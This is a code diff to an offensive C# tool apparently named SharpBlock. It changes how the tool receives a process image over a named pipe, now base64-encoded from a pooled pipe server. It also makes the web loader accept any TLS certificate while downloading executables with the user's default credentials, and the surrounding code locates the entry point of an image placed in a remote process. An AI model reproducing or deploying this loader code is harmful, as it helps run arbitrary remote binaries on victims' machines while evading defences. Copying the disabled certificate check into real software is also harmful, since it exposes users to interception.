@@ -422,27 +422,33 @@ namespace SharpBlock {
             return new IntPtr(pRemoteImage.ToInt64() + (PEINFO.Is32Bit ? PEINFO.OptHeader32.AddressOfEntryPoint : PEINFO.OptHeader64.AddressOfEntryPoint));
         }
 
-        static byte[] LoadProcessFromPipe(string path) {
+        static byte[] LoadProcessFromPipe(string path)
+        {
 
-            int amountRead = 0;
-            byte[] buffer = new byte[65536];
+            String PipeName = "";
             MemoryStream processDataStream = new MemoryStream();
-            string pipeName = path.Substring(9);
-            var npss = new NamedPipeServerStream(pipeName, PipeDirection.InOut, 1, PipeTransmissionMode.Byte);
 
-            Console.WriteLine($"[+] Waiting for process data from pipe {pipeName}");
-            npss.WaitForConnection();
+            PipeName = path.Substring(9);
+            Console.WriteLine($"[+] Waiting for process data from pipe {PipeName}");
 
-            while ((amountRead = npss.Read(buffer, 0, buffer.Length)) > 0) {
-                processDataStream.Write(buffer, 0, amountRead);
-            };
+            PipeServer ps = new PipeServer(5, PipeName);
+            ps.StartServers();
+            Console.WriteLine("[+] Namepipe receive over");
+            ps.DisposePipe();
+            byte[] PipeContentStream = Convert.FromBase64String(ps.GetContent().ToString());
 
-            npss.Disconnect();
-            return processDataStream.ToArray();      
+            processDataStream.Write(
+                PipeContentStream,
+                0,
+                PipeContentStream.Length
+            );
+
+            return processDataStream.ToArray();
         }
 
 
         static byte[] LoadProcessFromWeb(string url) {
+            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
             WebClient client = new WebClient();
             client.Credentials = CredentialCache.DefaultCredentials; 
             client.Proxy = WebRequest.GetSystemWebProxy();
